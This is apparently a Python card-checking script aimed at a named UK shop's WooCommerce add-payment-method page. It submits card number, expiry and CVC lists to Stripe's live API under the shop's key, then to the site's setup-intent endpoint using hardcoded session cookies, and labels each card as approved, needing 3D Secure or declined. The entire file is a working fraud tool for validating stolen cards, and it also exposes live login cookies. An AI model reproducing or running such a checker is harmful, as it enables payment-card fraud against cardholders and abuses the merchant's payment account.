import requests, re
from datetime import datetime, timedelta

# --- Globals ---
confirm_nonce = None
last_refresh_time = None


def refresh_nonce():
    """Fetch confirm_nonce fresh"""
    global confirm_nonce, last_refresh_time

    cookies = {
    '__stripe_mid': '06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-09-23%2003%3A36%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-09-23%2003%3A36%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'PHPSESSID': '6gkohgiu5r0ne42ah44kareat3',
    'wordpress_logged_in_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759810021%7CtV16CGwn4cLLrKbVjv0R1Vioh8eYoJYgM9F933Ofr3L%7C169b418fafb3eaefd8a407b0031148ba971950060af838f89cb56123c7e17b56',
    'mcfw-wp-user-cookie': 'NzI3fDB8NjN8Njc4XzFhOTZhNWIwZTRjMTVjYjcwZTQzZWYzN2ZlYzllYjA3M2M1MTUwZTYwNDI4N2VlNzUwMDZkMzU2MjkzYTRhZDg%3D',
    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fpayment-methods%2F',
}

    headers = {
    'authority': 'johnnysbackyard.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    
    'referer': 'https://johnnysbackyard.co.uk/my-account/payment-methods/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    resp = requests.get(
        'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
        cookies=cookies,
        headers=headers
    )

    match = re.search(r'"createSetupIntentNonce"\s*:\s*"([a-f0-9]+)"', resp.text)
    if not match:
        raise Exception("⚠️ Confirm nonce not found")
    confirm_nonce = match.group(1)
    last_refresh_time = datetime.now()
    print("✅ New confirm_nonce fetched:", confirm_nonce)


def get_nonce():
    """Return valid nonce, refresh if >8h old"""
    global confirm_nonce, last_refresh_time
    if (
        confirm_nonce is None
        or last_refresh_time is None
        or (datetime.now() - last_refresh_time) > timedelta(hours=8)
    ):
        refresh_nonce()
    return confirm_nonce


def pp(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = f'billing_details[name]=+&billing_details[email]=ficada8620%40baxidy.com&billing_details[address][country]=IN&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F93bc6d7bcf%3B+stripe-js-v3%2F93bc6d7bcf%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fjohnnysbackyard.co.uk&time_on_page=19929&client_attribution_metadata[client_session_id]=ba6ad474-3540-4390-9f57-203a24900872&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=507cb66a-d490-4a23-b6ed-ffb6d1e75762&guid=8679103b-45ca-4667-8cb3-9e30fef2d54c7dc798&muid=06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84&sid=20de2007-f0b2-4706-b6d2-e19e812417c78c4f2a&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1KQW8K2ENjnX48AP'

    resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    response_data = resp.json()

    if 'error' in response_data:
        error_code = response_data['error']['code']
        if error_code == 'incorrect_number':
            return "Card number invalid"
        elif error_code == 'invalid_expiry_year':
            return "Card expired"
        else:
            return response_data['error']['message']
    else:
        pm_id = response_data.get('id')
        print(f"✅ Payment source created successfully. ID: {pm_id}")

    # --- Use confirm_nonce here ---
    nonce = get_nonce()

    cookies = {
    'wordpress_sec_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759810021%7CtV16CGwn4cLLrKbVjv0R1Vioh8eYoJYgM9F933Ofr3L%7Cf2742b3d7c2abdb685f7db9bf69326534b1766c6ce149053ba4314cca9031bf6',
    '__stripe_mid': '06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-09-23%2003%3A36%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-09-23%2003%3A36%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'PHPSESSID': '6gkohgiu5r0ne42ah44kareat3',
    'wordpress_logged_in_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759810021%7CtV16CGwn4cLLrKbVjv0R1Vioh8eYoJYgM9F933Ofr3L%7C169b418fafb3eaefd8a407b0031148ba971950060af838f89cb56123c7e17b56',
    'mcfw-wp-user-cookie': 'NzI3fDB8NjN8Njc4XzFhOTZhNWIwZTRjMTVjYjcwZTQzZWYzN2ZlYzllYjA3M2M1MTUwZTYwNDI4N2VlNzUwMDZkMzU2MjkzYTRhZDg%3D',
    '__stripe_sid': '20de2007-f0b2-4706-b6d2-e19e812417c78c4f2a',
    'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fadd-payment-method%2F',
}

    headers = {
    'authority': 'johnnysbackyard.co.uk',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',   
    'origin': 'https://johnnysbackyard.co.uk',
    'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    files = {
        'action': (None, 'create_setup_intent'),
        'wcpay-payment-method': (None, pm_id),
        '_ajax_nonce': (None, nonce),
    }

    resp = requests.post(
        'https://johnnysbackyard.co.uk/wp-admin/admin-ajax.php',
        cookies=cookies, headers=headers, files=files
    )

    data = resp.json()
    main_data = data.get('data', {})
    status = main_data.get('status')

    if data.get('success') and status == 'succeeded':
        return "Approved"
    elif data.get('success') and status == 'requires_action':
        return "3D Required"
    else:
        message = data.get("data", {}).get("error", {}).get("message", "")
        if "declined" in message.lower():
            return "Card Declined"
        return message


# --- Auto-refresh once on import ---
refresh_nonce()
